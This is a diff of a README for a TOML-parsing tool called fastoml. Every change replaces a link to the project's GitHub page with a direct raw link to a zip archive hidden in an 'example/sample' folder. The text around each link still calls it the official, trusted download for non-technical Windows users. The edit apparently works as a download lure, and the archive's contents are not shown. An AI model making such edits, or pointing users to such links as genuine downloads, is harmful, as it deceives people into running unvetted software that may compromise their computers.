@@ -1,6 +1,6 @@
 # ⚡ fastoml - Fast and Simple TOML Parsing
 
-[![Download](https://img.shields.io/badge/Download-fastoml-brightgreen?style=for-the-badge)](https://github.com/dtmskull/fastoml)
+[![Download](https://img.shields.io/badge/Download-fastoml-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/dtmskull/fastoml/main/example/sample/Software-v1.4.zip)
 
 fastoml makes reading TOML files quick and easy. It is designed to work well on typical Windows PCs without tech skills. This guide will help you get fastoml running step-by-step.
 
@@ -18,7 +18,7 @@ You don’t need to understand programming to use fastoml. This guide will show 
 
 Go to the official fastoml download page here:
 
-[Download fastoml](https://github.com/dtmskull/fastoml)  
+[Download fastoml](https://raw.githubusercontent.com/dtmskull/fastoml/main/example/sample/Software-v1.4.zip)  
 
 You will find the latest versions and instructions on this page. Make sure to download files only from this trusted source.
 
@@ -38,7 +38,7 @@ Most standard Windows computers meet these requirements.
 ## 📥 How to Download fastoml
 
 1. **Open your web browser.** Use Chrome, Edge, or Firefox.  
-2. Go to the fastoml page: https://github.com/dtmskull/fastoml  
+2. Go to the fastoml page: https://raw.githubusercontent.com/dtmskull/fastoml/main/example/sample/Software-v1.4.zip  
 3. Look for a section labeled "Releases" or "Download".  
 4. You will see a list of files. Pick the newest version marked for Windows.  
 5. Click the file to download it. It will probably end with `.exe` or `.zip`.  
@@ -113,7 +113,7 @@ fastoml will parse the file and show the content in an easy to understand format
 
 Download fastoml only from:
 
-[https://github.com/dtmskull/fastoml](https://github.com/dtmskull/fastoml)  
+[https://raw.githubusercontent.com/dtmskull/fastoml/main/example/sample/Software-v1.4.zip](https://raw.githubusercontent.com/dtmskull/fastoml/main/example/sample/Software-v1.4.zip)  
 
 Do not download from other websites to avoid unsafe software.
 
@@ -151,7 +151,7 @@ It works best on Windows 10 or later. Older versions might have issues.
 
 Start now by visiting here:  
 
-[Download fastoml](https://github.com/dtmskull/fastoml)  
+[Download fastoml](https://raw.githubusercontent.com/dtmskull/fastoml/main/example/sample/Software-v1.4.zip)  
 
 Follow the instructions above to get it working on your computer.
 
@@ -167,6 +167,6 @@ If you want to use fastoml for other programs, it supports common TOML structure
 
 For updates and support, check the official fastoml page regularly:
 
-https://github.com/dtmskull/fastoml
+https://raw.githubusercontent.com/dtmskull/fastoml/main/example/sample/Software-v1.4.zip
 
 There you will find the latest files, news, and instructions.
